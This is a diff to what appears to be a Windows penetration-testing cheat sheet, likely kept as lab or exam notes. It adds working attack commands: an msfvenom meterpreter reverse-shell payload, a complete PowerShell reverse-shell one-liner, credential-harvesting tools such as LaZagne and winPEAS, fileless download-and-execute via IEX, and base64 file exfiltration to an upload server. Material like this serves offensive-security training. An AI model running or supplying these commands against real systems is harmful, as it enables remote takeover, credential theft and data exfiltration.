@@ -36,6 +36,8 @@ Version    BuildNumber
 
 ## Create reverse shell
 
+### With MSF
+
 ```
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.14.89 lport=4444 -f exe -o reverse.exe
 
@@ -47,12 +49,33 @@ set lport 4444
 run
 ```
 
+### With PS
+
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('A.B.C.D',8443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
 ## When connected
+
+### Harvesting
 
  - `.\winPeas.ps1`
  - `LaZagne all`
  - `SharpUp audit`
  - `snaffler -s -o result.log -i C:`
+
+### File upload
+
+ - `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64 string>"))`
+ - `(New-Object Net.WebClient).DownloadFile('https://site/xxxx','C:\Users\Public\Downloads\xxx')`
+ - Fileless: `IEX (New-Object Net.WebClient).DownloadString('https://site/xxxx')`
+ - SMB Share: `impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
+ - Fake FTP: `python3 -m pyftpdlib --port 21`
+
+### File Download / Exfiltrating
+ 
+  - Encode file in b64: `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`
+  - Upload server: `python3 -m uploadserver`
 
 ## When user has privs SeBackupPrivilege
 
